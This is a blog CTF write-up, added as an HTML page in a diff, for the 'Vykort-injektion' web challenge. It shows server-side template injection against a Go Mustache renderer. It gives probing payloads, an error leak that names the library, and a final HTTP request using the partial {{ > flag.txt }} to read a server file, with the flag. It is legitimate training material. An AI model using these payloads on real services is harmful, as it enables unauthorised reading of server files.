@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Vykort-injektion  &ndash; alanoo.dev</title>
+    <meta name="description" content="My dev page :)">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8" />
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" integrity="sha512-HK5fgLBL+xu6dm/Ii3z4xhlSUyZgTT9tuc/hSrtw6uzJOvgRr2a9jyxxT1ely+B+xFAmJKVSTbpM/CuL7qxO8w==" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />
+    <link rel="stylesheet" href="/css/colour/gruvbox-dark.css">
+    <link rel="stylesheet" href="/css/colour/dark-mode.css">
+    <link rel="stylesheet" href="/css/risotto.css">
+    <link rel="stylesheet" href="/css/custom.css">
+</head>
+
+<body>
+    <div class="page">
+        <header class="page__header">
+            <h1 class="page__logo"><a href="/" class="page__logo-inner">alanoo.dev</a></h1>
+            <nav class="page__nav main-nav">
+                <ul>
+                    <li class="main-nav__item"><a class="nav-main-item" href="/posts/" title="Posts">wip</a></li>
+                    <li class="main-nav__item"><a class="nav-main-item" href="/writeups/" title="Writeups">Writeups</a></li>
+                    <li class="main-nav__item"><a class="nav-main-item" href="/projects/" title="Projects">wip</a></li>
+                </ul>
+            </nav>
+        </header>
+
+        <section class="page__body">
+            <header class="content__header">
+                <h1>Vykort-injektion <code><span style="color:#2ed8e8">web</code> <code><span style="color:#e52d2d">hard</code></pre></h1>
+            </header>
+            <div class="content__body">
+                <h2 id="kategori">Category</h2>
+                <p>Web</p>
+                <h2 id="beskrivning">Chall Author</h2>
+                <p>Movitz Sunar</p>
+                <h2 id="beskrivning">Stats</h2>
+                <p>Total Solves: <strong>7/20 Teams</strong></p>
+                <p>Final Points: <strong>350p</strong></p>
+                <h2 id="beskrivning">Description</h2>
+                <p>Sending postcards is made easier with our nice templates. The flag is in /flag.txt :)</p>
+                <h2 id="lösning">Solution</h2>
+                <p>I was only provided the link to the chall website so no source this time unfortunately. Navigating to the chall site I was greeted with this simple Generator:</p>
+                <p><img src="/writeups/ssm-2025/vykort/assets/pic1.png" alt="Vykort-injektion"></p>
+                <p>The first thing I did was to of course check the functionality of the site and the html. For reference here's the html:</p>
+
+                <div class="highlight">
+                    <pre style="font-size: 12px; scrollbar-color: #333 #000; scrollbar-width: thin; overflow: auto;"><code class="language-html">
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+    &lt;meta charset='utf-8'&gt;
+    &lt;meta http-equiv='X-UA-Compatible' content='IE=edge'&gt;
+    &lt;title&gt;Vykort-injektion&lt;/title&gt;
+    &lt;meta name='viewport' content='width=device-width, initial-scale=1'&gt;
+    &lt;link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous"&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+
+    &lt;div class="container"&gt;
+
+        &lt;h1&gt;Vykort-injektion? &lt;/h1&gt;
+
+        &lt;div class="row"&gt;
+            &lt;div class="col"&gt;
+
+                &lt;div class="form-group"&gt;
+                    &lt;label for="exampleFormControlSelect2"&gt;Choose options:&lt;/label&gt;
+                    &lt;select class="form-control" id="exampleFormControlSelect2"&gt;
+                        &lt;option value="godjul"&gt;Julhälsning&lt;/option&gt;
+                        &lt;option value="grattis"&gt;Gratulationer&lt;/option&gt;
+                        &lt;option value="hatbrev"&gt;Hatbrev&lt;/option&gt;
+                    &lt;/select&gt;
+                &lt;/div&gt;
+
+                &lt;!-- Mottagarens namn --&gt;
+                &lt;div class="mb-3"&gt;
+                    &lt;label for="recipientName" class="form-label"&gt;Mottagarens namn&lt;/label&gt;
+                    &lt;input type="text" class="form-control" id="recipientName" placeholder="Ange mottagarens namn"&gt;
+                &lt;/div&gt;
+
+                &lt;!-- Ditt namn --&gt;
+                &lt;div class="mb-3"&gt;
+                    &lt;label for="yourName" class="form-label"&gt;Ditt namn&lt;/label&gt;
+                    &lt;input type="text" class="form-control" id="yourName" placeholder="Ange ditt namn"&gt;
+                &lt;/div&gt;
+
+                &lt;!-- Hälsning --&gt;
+                &lt;div class="mb-3"&gt;
+                    &lt;label for="greeting" class="form-label"&gt;Hälsning&lt;/label&gt;
+                    &lt;textarea class="form-control" id="greeting" rows="3" placeholder="Skriv din hälsning"&gt;&lt;/textarea&gt;
+                &lt;/div&gt;
+
+                &lt;!-- Skicka knapp --&gt;
+                &lt;button type="submit" class="btn btn-primary" onclick="render()"&gt;Skicka&lt;/button&gt;
+
+            &lt;/div&gt;
+
+            &lt;div class="col"&gt;
+
+                &lt;code id="output"&gt;&lt;/code&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;script&gt;
+        const templates = {
+            "godjul": `
+                God jul, \{{ recipientName }}!
+
+                \{{ greeting }}
+                
+                önskar 🎅🎅 \{{ yourName }}🎅🎅 
+            `,
+
+            "grattis": `
+                Hej \{{ recipientName  }}!
+
+                \{{ greeting }}
+                
+                Mvh
+                \{{ yourName }}
+            `,
+            "hatbrev": `
+                Hej \{{ recipientName  }}!
+
+                Jag uppskattar dig inte! :<
+
+                \{{ greeting }}
+                
+                Mvh
+                \{{ yourName }}
+            `,
+        }
+
+        function render() {
+            fetch("/vykort", {
+                method: "POST",
+                body: JSON.stringify({
+                    template: templates[exampleFormControlSelect2.value],
+                    data: {
+                        recipientName: recipientName.value,
+                        yourName: yourName.value,
+                        greeting: greeting.value,
+                    }
+                })
+            }).then(r => r.text())
+                .then(j => {
+                    output.innerText = j
+                })
+        }
+    &lt;/script&gt;
+
+&lt;/body&gt;
+
+&lt;/html&gt;
+                    </code></pre>
+                </div>
+                <p>As we can see we are working with some kind of SSTI (Server side template injection). During the CTF I did try normal tests for SSTI like {{ 7*7 }} and {{ config }} but these didn't work.</p>
+                <p>I decided to start gathering as much information as I could which led me to start bullying the POST request to /vykort:</p>
+                <div class="highlight">
+                    <pre style="font-size: 14px;"><code class="language-javascript">
+    function render() {
+        fetch("/vykort", {
+            method: "POST",
+            body: JSON.stringify({
+                template: templates[exampleFormControlSelect2.value],
+                data: {
+                    recipientName: recipientName.value,
+                    yourName: yourName.value,
+                    greeting: greeting.value,
+                }
+            })
+        }).then(r => r.text())
+            .then(j => {
+                output.innerText = j;
+            });
+    }
+                    </code></pre>
+                </div>
+                
+                <p>Something I reccomend doing when working with sourceless web challs is to try everything and i mean <strong><span style="color:#e76e6e">EVERYTHING</strong>. If you haven't gotten much input/volume of web chall knowledge you can always ask chatgpt or other AI models for things to try.</p>
+                <p>In this case i wanted to see if I could get any info from the server when i send <strong>malformed requests</strong>, similair to how php gives you a whole page of errors and juicy info sometimes. Ill skip all my attempts and cut the the interesting ones but first heres the normal input we are working with:</p>
+                <p><img src="/writeups/ssm-2025/vykort/assets/pic2.png" alt="burp" style="width: 75%; height: 75%;"></p>
+<div style="display: flex; gap: 20px;">
+    <div class="highlight" style="flex: 1;">
+        <pre><code class="language-javascript">
+{
+    "template": "{{ . }}",
+    "data": {
+        "recipientName": "skibidi",
+        "yourName": "rizz"
+    }
+}
+        </code></pre>
+    </div>
+
+    <div class="highlight" style="margin-right: auto;">
+        <pre><code class="language-javascript">
+
+// This returns map which shows
+// that it might be a golang SSTI.
+
+map[recipientName:skibidi yourName:rizz]
+
+
+        </code></pre>
+    </div>
+</div>
+
+                <p>Alright I am not proud of this but because I've never worked with ssti in golang but I figured that <strong>map[]</strong> was the right path to the flag because it listed information that I could control. <strong><span style="color:#e76e6e">TLDR:</span><span style="color:#dfcde4"> it was not :(</strong></p>
+                <p>After wasting some time on that rabbit hole I rememberd to try sending malformed requests which turned out to be a smart choice:</p>
+
+ <div style="display: flex; gap: 20px;">
+    <div class="highlight" style="flex: 1;">
+        <pre><code class="language-javascript">
+{
+    "template": "{{ a",
+    "data": {
+        "recipientName": "oogabooga"
+    }
+}
+        </code></pre>
+    </div>
+
+    <div class="highlight" style="margin-right: auto;">
+        <pre><code class="language-javascript">
+HTTP/1.1 500 Internal Server Error
+Content-Length: 64
+Content-Type: text/plain; charset=utf-8
+            
+github.com/hoisie/mustache:
+line 1: unmatched open tag
+        </code></pre>
+    </div>
+</div>
+<p><strong>THIS IS HUGE!</strong> Not only do we get affirmation that the backend is written in <strong>golang</strong>, but we also now know that the server uses the library <span style="color:#7482f1"><strong>hoisie mustache</strong></span> for it's templates.</p>
+<p>Unfortunately the current hoisise mustache repo isn't being maintained but I found a fork with the manual:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#8cdfdf">https://github.com/cbroglie/mustache</span></pre></code></div>
+<p>Reading through the man page I was searching for ways to read files like flag.txt and in the section <a href="https://mustache.github.io/mustache.5.html#:~:text=may%20contain%20newlines.-,Partials,-Partials%20begin%20with"><span style="color:#eb2ea6"><strong>Partials</strong></span></a> it explains how we can for example use {{> user}} to get the partial "user".</p>
+<p>And after some tinkering and trying i finally got the payload <code><span style="color:#e1da74">{{ > main.go }}</span></code> to as a response give:</p>
+<p><img src="/writeups/ssm-2025/vykort/assets/pic3.png" alt="burp2"></p>
+<h2>Final Payload</h2>
+<div class="highlight">
+    <pre style="font-size: 12px;"><code class="language-javascript">
+POST /vykort HTTP/1.1
+Host: localhost:8100
+Content-Length: 31
+sec-ch-ua-platform: "Windows"
+Accept-Language: en-GB,en;q=0.9
+sec-ch-ua: "Chromium";v="133", "Not(A:Brand";v="99"
+Content-Type: text/plain;charset=UTF-8
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
+Origin: http://localhost:8100
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:8100/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+        
+{"template":"{{ > flag.txt }}"}
+    </code></pre>
+</div>
+                <h2>Flag</h2>
+                <code><span style="color:#c3b8de">SSM{n3ver_tru57_0p3n_s0urc3}</span></code>
+            </div>
+            <footer class="content__footer"></footer>
+        </section>
+
+        <section class="page__aside">
+            <div class="aside__about">
+                <div class="aside__about">
+                    <h1 class="about__title">alanoo.dev</h1>
+                    <p class="about__description">My dev page :).</p>
+                </div>
+                <ul class="aside__social-links">
+                    <li>
+                        <a href="https://admin.tryhackme.com" rel="me" aria-label="secret" title="secret"><i class="fas fa-flag" aria-hidden="true"></i></a>&nbsp;
+                    </li>
+                </ul>
+            </div>
+            <hr>
+            <div class="aside__content">
+                <p>
+                    By alanoo, 
+                    2025-03-16
+                </p>
+            </div>
+        </section>
+
+        <footer class="page__footer">
+            <p class="copyright"></p>
+            <p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
+        </footer>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-html.min.js"></script>
+</body>
+
+</html>
